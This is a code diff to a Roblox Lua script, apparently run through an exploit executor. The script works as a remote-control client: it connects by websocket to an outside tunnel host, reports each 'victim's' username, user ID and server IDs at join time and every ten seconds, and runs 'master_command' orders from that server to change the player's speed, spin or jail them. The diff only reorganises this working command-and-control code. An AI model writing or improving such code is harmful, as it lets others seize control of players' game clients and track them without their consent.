@@ -8,7 +8,7 @@ local LocalPlayer = Players.LocalPlayer
 
 local WS_URL = "wss://outsourcing-poetry-alternatively-sonic.trycloudflare.com"
 
-local WS_Connect = (WebSocket and WebSocket.connect) or (websocket and websocket.connect) or (syn and syn.websocket and syn.websocket.connect) or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
+local WS_Connect = (WebSocket and WebSocket.connect) or (websocket and websocket.connect) or (syn and syn.websocket and syn.websocket.connect)
 if not WS_Connect then return end
 
 if _G.SacredVictimWS then
@@ -17,7 +17,6 @@ if _G.SacredVictimWS then
 end
 
 local currentJail = nil
-local isSpinning = false
 local speedLoop = nil
 
 local function getGui()
@@ -69,21 +68,21 @@ local function handleCommand(data)
         root.Anchored = false
 
     elseif data.action == "super_speed" and hum then
-        if speedLoop then speedLoop:Disconnect() speedLoop = nil end
+        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
         hum.WalkSpeed = 250
         speedLoop = RunService.RenderStepped:Connect(function()
             if hum and hum.Parent then hum.WalkSpeed = 250 end
         end)
 
     elseif data.action == "snail_speed" and hum then
-        if speedLoop then speedLoop:Disconnect() speedLoop = nil end
+        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
         hum.WalkSpeed = 3
         speedLoop = RunService.RenderStepped:Connect(function()
             if hum and hum.Parent then hum.WalkSpeed = 3 end
         end)
 
     elseif data.action == "normal_speed" and hum then
-        if speedLoop then speedLoop:Disconnect() speedLoop = nil end
+        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
         hum.WalkSpeed = 16
 
     elseif data.action == "spin" and root then
@@ -242,52 +241,59 @@ task.spawn(function()
         if ok and ws then
             _G.SacredVictimWS = ws
 
-            local function sendPresence(msgType)
-                pcall(function()
-                    local jid = tostring(game.JobId or "")
-                    local payload = HttpService:JSONEncode({
-                        type = msgType or "victim_joined",
-                        username = LocalPlayer.Name,
-                        userId = LocalPlayer.UserId,
-                        placeId = game.PlaceId,
-                        gameId = game.GameId,
-                        jobId = jid
-                    })
-                    local fn = ws.Send or ws.send
-                    if type(fn) == "function" then fn(ws, payload) else ws:Send(payload) end
-                end)
-            end
-
             task.wait(0.5)
-            sendPresence("victim_joined")
+            pcall(function()
+                ws:Send(HttpService:JSONEncode({
+                    type = "victim_joined",
+                    username = LocalPlayer.Name,
+                    userId = LocalPlayer.UserId,
+                    placeId = game.PlaceId,
+                    gameId = game.GameId,
+                    jobId = tostring(game.JobId or "")
+                }))
+            end)
 
             local function onMsg(raw)
                 local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
                 if s and data then
                     if data.type == "ping_victims" then
-                        sendPresence("victim_joined")
-                    elseif data.type == "master_command" then
-                        task.spawn(function()
-                            pcall(handleCommand, data)
+                        pcall(function()
+                            ws:Send(HttpService:JSONEncode({
+                                type = "victim_joined",
+                                username = LocalPlayer.Name,
+                                userId = LocalPlayer.UserId,
+                                placeId = game.PlaceId,
+                                gameId = game.GameId,
+                                jobId = tostring(game.JobId or "")
+                            }))
                         end)
+                    elseif data.type == "master_command" then
+                        handleCommand(data)
                     end
                 end
             end
 
             pcall(function() ws.OnMessage:Connect(onMsg) end)
-            pcall(function() ws.onmessage = onMsg end)
 
             local isClosed = false
             pcall(function()
-                ws.OnClose:Connect(function() isClosed = true end)
-            end)
-            pcall(function()
-                ws.onclose = function() isClosed = true end
+                ws.OnClose:Connect(function()
+                    isClosed = true
+                end)
             end)
 
             while not isClosed and _G.SacredVictimWS == ws do
                 task.wait(10)
-                sendPresence("victim_ping")
+                pcall(function()
+                    ws:Send(HttpService:JSONEncode({
+                        type = "victim_ping",
+                        username = LocalPlayer.Name,
+                        userId = LocalPlayer.UserId,
+                        placeId = game.PlaceId,
+                        gameId = game.GameId,
+                        jobId = tostring(game.JobId or "")
+                    }))
+                end)
             end
         end
         task.wait(3)
